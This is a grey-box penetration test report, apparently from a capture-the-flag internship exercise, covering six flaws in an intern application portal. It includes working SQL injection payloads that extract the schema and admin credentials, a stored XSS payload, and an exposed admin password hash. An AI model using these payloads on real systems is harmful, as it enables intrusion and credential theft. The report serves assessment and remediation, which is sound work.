# MWR CyberSec Internship Portal - Security Assessment Report

**Assessor:** Thando Mashele  
**Assessment Date:** June 15, 2026  
**Target Application:** `interns.mwrcybersec.loc`  
**Methodology:** Grey-box penetration testing with authenticated intern access

---

## Executive Summary

A security assessment was conducted on the MWR CyberSec Internship Application Portal. The assessment identified **six vulnerabilities**: three High severity, two Medium severity, and one Informational finding.

The most critical finding is an **error-based SQL injection** in the login endpoint that enables full database extraction, including administrator credentials (`admin@mwr.com` with a bcrypt password hash). An **Insecure Direct Object Reference (IDOR)** on assignment memos allows any authenticated intern to access all assessment content and other users' submitted essays. A **sensitive data exposure** in the profile API response returned a flag and internal identifiers not visible in the frontend UI.

The JWT implementation correctly rejected algorithm downgrade and payload tampering attempts, which is a positive finding.

Immediate remediation of the SQL injection and IDOR vulnerabilities is strongly recommended.

---

## Methodology

Testing was conducted using **Burp Suite Community Edition** as an intercepting proxy, **Firefox** for browser-based testing, and manual HTTP request crafting via Burp Repeater. The assessment followed a grey-box approach (authenticated as a registered intern user) supplemented by unauthenticated testing on the login and registration endpoints.

The application's JavaScript bundle (`/assets/index-BZZ15g5T.js`) was analyzed for endpoint discovery, confirming admin routes and the use of React's `dangerouslySetInnerHTML` on leaderboard and admin applicant views.

JWT token structure and signature validation were tested:
- Algorithm downgrade to `"alg":"none"` - rejected with `422 INVALID_TOKEN`
- Payload tampering (`sub` changed from `132` to `1` with original signature retained) -  rejected with `422 INVALID_TOKEN`

Both tests confirmed robust token validation.

---

## Risk Rating Framework

| Severity | Definition |
|----------|------------|
| **Critical** | Immediate risk of full system compromise |
| **High** | Significant confidentiality, integrity, or availability impact |
| **Medium** | Conditional exploitation or limited impact |
| **Low** | Minor security weakness |
| **Informational** | Does not pose direct risk but not aligned with best practice |

---

## Findings

### Finding 1: Sensitive Data Exposure via Profile API Response

**Severity:** High  
**Endpoint:** `GET /api/v1/profile/`  
**Authentication:** Required (intern JWT)

**Description:**

The profile API endpoint returns sensitive internal data in its JSON response that is not rendered in the frontend user interface. During the assessment, the response contained a `flag` field with value `MWR{779689a8c099b81a23c4ebe59177ba5e}` alongside standard profile fields. The response also includes internal identifiers and metadata beyond what is displayed to the user in the UI.

**Reproduction Steps:**

1. Register an account and complete the three required assessments
2. Upload a CV and submit the application
3. Send `GET /api/v1/profile/` with a valid JWT in the `Authorization: Bearer` header
4. Observe the `flag` field in the JSON response body

**Evidence:** `01_profile_api_response.png`

**Business Impact:**

Any authenticated intern can retrieve sensitive internal data not intended for client-side visibility. This includes flags, internal identifiers, and application metadata.

**Remediation:**

Implement server-side response filtering to ensure only fields necessary for the frontend are returned. Remove debug, flag, and internal metadata fields from production API responses. Use Data Transfer Objects (DTOs) to explicitly control which fields are serialized.

---

### Finding 2: Insecure Direct Object Reference (IDOR) on Assignment Memos

**Severity:** High  
**Endpoint:** `GET /api/v1/assignments/{id}/memo`  
**Authentication:** Required (intern JWT)

**Description:**

The assignment memo endpoint lacks proper authorization checks. An authenticated intern can access the memos of any assignment by incrementing the ID parameter in the URL, regardless of whether they completed that assignment or own the submission. Memos contain full question text, correct answer indicators (`is_correct: true/false`), essay scores, and other users' submitted essay content.

**Reproduction Steps:**

1. Authenticate with any valid intern JWT
2. Send `GET /api/v1/assignments/1/memo` - observe full OWASP Top 10 quiz with correct answers
3. Send `GET /api/v1/assignments/2/memo` - observe Secure Code Review quiz with another user's essay
4. Send `GET /api/v1/assignments/3/memo` - observe Web App Pentesting quiz with another user's essay

**Evidence:** `02_idor_memo_id1.png`, `03_idor_memo_id2.png`, `04_idor_memo_id3.png`

**Business Impact:**

- **Confidentiality breach:** Attackers can enumerate all assignment content and answers
- **Assessment integrity compromised:** Correct answers are exposed, allowing cheating
- **Privacy violation:** Other users' submitted essay content is accessible

**Remediation:**

Implement server-side authorization checks verifying that the requesting user has completed the assignment before returning memo data. Return `403 Forbidden` or `404 Not Found` for unauthorized access attempts. Do not rely on client-side hiding of memo links.

---

### Finding 3: SQL Injection in Login Endpoint

**Severity:** High (borderline Critical)  
**Endpoint:** `POST /api/v1/auth/login`  
**Vulnerable Parameter:** `email`  
**Authentication:** None required

**Description:**

The `email` field in the login endpoint is vulnerable to error-based SQL injection. The backend uses MariaDB 10.11.14. A single quote (`'`) in the email field triggers a verbose SQL syntax error, confirming the injection point. Using `extractvalue()`-based error extraction, the full database schema and administrator credentials were exfiltrated.

**Database Reconnaissance Results:**

| Extraction | Result |
|------------|--------|
| DBMS Version | `10.11.14-MariaDB-0ubuntu0.24...` |
| Database Name | `internapp` |
| Tables | `questions, users, assignments, user_answers, cvs, token_blocklist` |
| Users Columns | `id, name, surname, nickname, university, email, degree, password_hash, role, application_submitted, submitted_at, created_at` |
| Total Users | 123 |
| Admin Email | `admin@mwr.com` |
| Admin Password Hash | `$2b$12$M184bOxBD5haDOXCco2oyefyDLZ9mXnULsk5KBAsUzpVzzwpdj7s6` (bcrypt, cost factor 12) |

**Reproduction Steps:**

1. Confirm injection: `{"email": "'", "password": "test"}` → MariaDB syntax error
2. Extract version: `{"email": "x' AND extractvalue(1,concat(0x7e,(SELECT version()))) -- -", "password": "test"}`
3. Extract database: `{"email": "x' AND extractvalue(1,concat(0x7e,(SELECT database()))) -- -", "password": "test"}`
4. Extract tables: `{"email": "x' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- -", "password": "test"}`
5. Extract admin credentials: `{"email": "x' AND extractvalue(1,concat(0x7e,(SELECT concat(email,0x3a,password_hash) FROM users WHERE id=1))) -- -", "password": "test"}`

**Evidence:** `06_sqli_quote_error.png` through `13_admin_hash_p2.png`

**Business Impact:**

Complete database compromise. An attacker can extract all data from every table, retrieve all user credentials for offline cracking, and access PII of 123+ registered users. This can be chained with admin endpoints for full application compromise.

**Remediation:**

- **Immediate:** Replace string concatenation with parameterized queries (prepared statements) for all database operations
- Use an ORM with built-in SQL injection protections
- Implement input validation and sanitization
- Configure the database user with least-privilege permissions
- Disable verbose SQL error messages in production

---

### Finding 4: Leaderboard Information Disclosure

**Severity:** Informational  
**Endpoint:** `GET /api/v1/leaderboard/`  
**Authentication:** Required (intern JWT)

**Description:**

The leaderboard endpoint returns the full rankings of all 121+ registered interns, including their nicknames, scores, rank positions, and completion times. The nicknames are display handles (`intern_088`, etc.) rather than real names or email addresses. While not directly exploitable, this exposes internal user metrics to any authenticated user without a demonstrated business need.

**Evidence:** `05_leaderboard_response.png`

**Business Impact:** Low - internal metrics and display handles exposed. No PII or credentials leaked.

**Remediation:** Restrict leaderboard to top 10/25 only, or require user opt-in consent.

---

### Finding 5: Stored XSS via Profile Fields

**Severity:** Medium  
**Endpoint:** `PATCH /api/v1/profile/`  
**Authentication:** Required (intern JWT)

**Description:**

Analysis of the JavaScript bundle confirmed the use of React's `dangerouslySetInnerHTML` when rendering profile fields on the leaderboard and admin applicant views. XSS payloads injected via the profile `PATCH` endpoint were accepted by the server. While HTML-encoded in the API response, the `dangerouslySetInnerHTML` method renders strings as raw HTML without sanitization, meaning execution may still occur in the admin viewing context if encoding is not consistently applied.

Full execution could not be confirmed because the profile locks after application submission and admin views are inaccessible to intern-role tokens.

**Reproduction Steps:**

1. Send `PATCH /api/v1/profile/` with `{"nickname": "<img src=x onerror=alert(1)>"}`
2. Payload is stored and visible in subsequent `GET /api/v1/profile/` responses

**Evidence:** `14_xss_patch_request.png`, `15_xss_nickname_stored.png`, `16_xss_profile_view.png`

**Business Impact:** If triggered in admin context: session theft, admin actions, data exfiltration. Conditional on admin viewing compromised profile.

**Remediation:** Remove `dangerouslySetInnerHTML`. Use safe text rendering or DOMPurify. Implement Content Security Policy headers.

---

### Finding 6: User Enumeration via Registration Endpoint

**Severity:** Medium  
**Endpoint:** `POST /api/v1/auth/register`  
**Authentication:** None required

**Description:**

The registration endpoint returns different responses for existing vs. new email addresses. Existing emails return `409 CONFLICT`, new emails return `201 CREATED`, enabling user enumeration. On an earlier machine instance, the 409 response also leaked the existing user's ID, role, and bcrypt password hash via a `debug` field.

**Reproduction Steps:**

1. Existing email → `409 CONFLICT` with `{"code":"EMAIL_EXISTS"}`
2. New email → `201 CREATED` with `{"message":"Registration successful"}`

**Evidence:** `16_register_existing_email.png`, `17_register_success.png`

**Business Impact:** User enumeration enables targeted attacks against known registered users.

**Remediation:** Return identical generic responses for both cases. Remove all debug data from production errors. Implement rate limiting.

---

## Vulnerability Summary

| # | Finding | Severity | Flag |
|---|---------|----------|------|
| 1 | Sensitive Data Exposure via Profile API | High | MWR{779689a8c099b81a23c4ebe59177ba5e} |
| 2 | IDOR on Assignment Memos | High | - |
| 3 | SQL Injection in Login Endpoint | High | - |
| 4 | Leaderboard Information Disclosure | Informational | - |
| 5 | Stored XSS via Profile Fields | Medium | - |
| 6 | User Enumeration via Registration | Medium | - |

---

## Remediation Priority

| Priority | Finding | Action |
|----------|---------|--------|
| **1** | SQL Injection (Finding 3) | Implement parameterized queries immediately |
| **2** | IDOR on Memos (Finding 2) | Add server-side authorization checks |
| **3** | Sensitive Data Exposure (Finding 1) | Filter API responses, implement DTOs |
| **4** | Stored XSS (Finding 5) | Remove dangerouslySetInnerHTML, use DOMPurify |
| **5** | User Enumeration (Finding 6) | Return generic registration responses |
| **6** | Leaderboard Disclosure (Finding 4) | Restrict scope or require opt-in |

---

## Conclusion

Six vulnerabilities were identified, including three High severity findings. The SQL injection vulnerability represents the most critical risk, enabling full database extraction. Combined with admin endpoints discovered via JavaScript analysis and the IDOR on assignment memos, multiple paths to confidentiality breach exist. The JWT implementation correctly rejected all tampering attempts which is a positive finding. Immediate remediation of SQL injection and IDOR is strongly recommended.

---

**End of Report**
